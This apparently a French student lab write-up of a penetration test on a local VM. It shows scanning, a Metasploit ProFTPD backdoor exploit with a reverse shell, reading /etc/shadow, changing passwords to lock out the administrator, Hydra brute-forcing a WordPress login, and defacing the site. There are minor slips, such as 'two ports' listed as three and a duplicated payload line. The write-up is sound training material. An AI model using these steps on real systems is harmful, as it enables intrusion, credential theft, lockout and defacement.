# Livrable 1
*JOUET Malo & PENCRANE Alexis*

## Rappel des objectifs

1. L'attaquant peut-il accéder aux fichiers du système d'exploitation ?
2. L'attaquant peut-il usurper l'identité du compte administrateur ?
3. L'attaquant peut-il bloquer l'accès a l'administrateur ?
4. L'attaquant peut-il modifier le contenu du site web ?
5. L'attaquant peut-il bloquer l'accès a l'administrateur a l'outil de conception de site web ?

## Etape 1: Decouverte de la cible

### 1.1. Decouverte du reseau

> Nous savons que la machine cible ce trouve sur le même réseau que notre machine nous allons donc utiliser le commande netdiscover pour trouver l'adresse IP de la machine cible.

```bash
netdiscover -i eth1 -r 192.168.56.0/24
```

| IP            | At MAC Address       | Count | Len | MAC Vendor / Hostname     |
|---------------|----------------------|-------|-----|---------------------------|
| 192.168.56.1  | 0a:00:27:00:00:0c    | 1     | 60  | Unknown vendor            |
| 192.168.56.102| 08:00:27:7a:fa:4f    | 1     | 60  | PCS Systemtechnik GmbH    |

**Nous voyons que la machine cible a pour adresse IP 192.168.56.102**

### 1.2. Decouverte des services

> Nous allons utiliser la commande nmap pour scanner les ports ouverts sur la machine cible. Nous allons d'abord commencer par un scan rapide pour voir les ports ouverts.

```bash
nmap -p- 192.168.56.102 -vv -oN scan_global.txt
```

**Nous avons découvert 2 ports ouverts sur la machine cible:**
- 21 (ftp)
- 22 (ssh)
- 80 (http)

[Scan global](./file/scan_global.txt)

> Nous allons maintenant scanner les services qui sont derrière ces ports.

```bash
nmap -p 21 -sV --script vuln 192.168.56.102 -vv -oN scan_ftp.txt
```

**On peut observer dans le résultat du scan qu'il existe un grand nombre de vulnérabilité sur ce service et qu'il y a également une backdoor fonctionelle tester par nmap.**

[Scan ftp](./file/scan_ftp.txt)

```bash
nmap -p 22 -sV --script vuln 192.168.56.102 -vv -oN scan_ssh.txt
```

**Sur ce service nmap n'a tester aucune vulnérabilité, malgré qu'il y en ai un grand nombre.**

[Scan ssh](./file/scan_ssh.txt)

```bash
nmap -p 80 -sV --script vuln 192.168.56.102 -vv -oN scan_http.txt
```

**Sur ce service nmap a repérer plusieurs vulnérabilité, il a également fait une énumération des fichiers et des dossiers du site web qui nous apprend la présence d'un répertoire /secret.**

[Scan http](./file/scan_http.txt)

---
**Maintenant que nous avons découvert les services qui sont derrière les ports ouverts nous allons pouvoir passer a l'utilisation des outils de pentest.**
---

## Etape 2: Introduction dans la cible

### 2.1. Introduction dans la cible

> Nous allons utiliser le service ftp pour nous connecter a la machine cible et plus particulierement la backdoor repérer précedement.
>
> Comme nous connaisons deja la version  nous allons chercher un exploit avec metasploit.

```bash
msfconsole

search type:exploit proftpd 133c
```

| # | Name                                   | Disclosure Date | Rank      | Check | Description                                   |
|---|----------------------------------------|-----------------|-----------|-------|-----------------------------------------------|
| 0 | exploit/unix/ftp/proftpd_133c_backdoor | 2010-12-02      | excellent | No    | ProFTPD-1.3.3c Backdoor Command Execution    |

**Metasploit nous propose un exploit qui correspond parfaitement a notre recherche. Nous alons donc pouvoir le mettre en oeuvre.**

```bash
use exploit/unix/ftp/proftpd_133c_backdoor

# On configure l'addresse de la cible
set RHOST 192.168.56.102

# On configure le payload utilisé
set PAYLOAD set PAYLOAD cmd/unix/reverse

# On configure l'addresse IP de notre machine pour la connection en reverse
set LHOST 192.168.56.103

# On lance l'exploit
run
```

**Nous avons maintenant un shell sur la machine cible.**

## Etape 3: Atteinte des objectifs 1,2 et 3

### 3.1. Atteinte de l'objectif 1
*Rappel: L'attaquant peut-il accéder aux fichiers du système d'exploitation ?*

> Grâce a notre connection en reverse nous avons un shell sur la machine cible. Nous allons donc pouvoir utiliser les commandes linux pour atteindre notre objectif.
>
> Comme nous somme root nous pouvons voir n'importe qu'elle fichier du système comme les fichiers des autres utilisateurs.

```bash
ls /home
# On peut voir que le dossier marlinspike existe

ls /home/marlinspike
# La commande liste bien les fichiers

# nous pouvons également utiliser la commande cat pour lire le contenu des fichiers comme le fichier /etc/shadow qui nécessite des droits root pour être lu.
cat /etc/shadow
# La commande affiche bien le contenu du fichier
```

***Ce qui signifie que nous pouvons accéder aux fichiers du système d'exploitation.***

### 3.2. Atteinte de l'objectif 2
*Rappel: L'attaquant peut-il usurper l'identité du compte administrateur ?*

> En executant la commande id nous pouvons voir que nous somme root. Nous allons donc pouvoir usurper l'identité du compte administrateur.

```bash
id
```

*uid=0(root) gid=0(root) groups=0(root),65534(nogroup)*

***Ce qui signifie que nous somme root et que nous usuperons l'identité du compte administrateur.***

### 3.3. Atteinte de l'objectif 3
*Rappel: L'attaquant peut-il bloquer l'accès a l'administrateur ?*

> Nous allons utiliser la commande passwd pour changer le mot de passe du compte root et de marlinspike.

```bash
passwd root
# On change le mot de passe du compte root

passwd marlinspike
# On change le mot de passe du compte marlinspike
```

***Ce qui signifie que nous pouvons bloquer l'accès a l'administrateur.***

## Etape 4: Atteinte des objectifs 4 et 5

> Les étapes étant en rapport avec le site web nous allons utiliser le service http pour atteindre les objectifs.

### 4.1. Découverte du site web

> En arrivant sur le site web nous tombons sur une page quasiment vide

![Site web](./image/site_web_accueil.png)

> Mais en nous rapelant de notre scan nmap nous savons qu'il existe une partie cacher du site dans le repertoir /secret. Nous allons donc essayer d'y accéder.

![Site web](./image/site_web_secret.png)

> Nous arrivons maintenant sur un blog wordpress. Mais pour le moments nous n'avons pas la possibilité de modifier le contenu du site web. Nous allons donc essayer de trouver un moyen d'accéder a l'interface d'administration, pour cela nous allons simplement utiliser le boutons login de la page qui nous renvoie vers /secret/wp-login.php.

![Site web](./image/site_web_login.png)

> En cherchant sur internet on peut découvrir que le login par défaut est admin. Nous allons donc utiliser hydra pour trouver le mot de passe.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -e nsr http-get://192.168.56.102/secret/wp-admin -V
```

**Hydra nous a trouver le mot de passe du compte admin: admin**

### 4.2. Atteinte de l'objectif 4
*Rappel: L'attaquant peut-il modifier le contenu du site web ?*

> Nous allons maintenant nous connecter a l'interface d'administration du site web avec le compte admin et le mot de passe admin.

![Site web](./image/site_web_admin.png)

> Nous arrivons maintenant sur l'interface d'administration du site web. Nous allons donc pouvoir modifier le contenu du site web.

![Site web](./image/site_web_admin_interface.png)

> Nous allons maintenant modifier le contenu du site web pour y mettre un message.

![Site web](./image/site_web_admin_modif.png)

> Nous pouvons maintenant voir que le message a bien été modifier sur le site web.

![Site web](./image/site_web_modif.png)

***Ce qui signifie que nous pouvons modifier le contenu du site web.***

### 4.3. Atteinte de l'objectif 5
*Rappel: L'attaquant peut-il bloquer l'accès a l'administrateur a l'outil de conception de site web ?*

> Nous allons maintenant essayer de bloquer l'accès a l'interface d'administration du site web. Pour cela nous allons tous simplement changer le mot de passe du compte admin.

![Site web](./image/site_web_admin_modif_mdp.png)

> Nous pouvons maintenant voir que nous ne pouvons plus nous connecter a l'interface d'administration du site web.

![Site web](./image/site_web_admin_bloquer.png)

***Ce qui signifie que nous pouvons bloquer l'accès a l'administrateur a l'outil de conception de site web.***

## Etape 5: Conclusion

















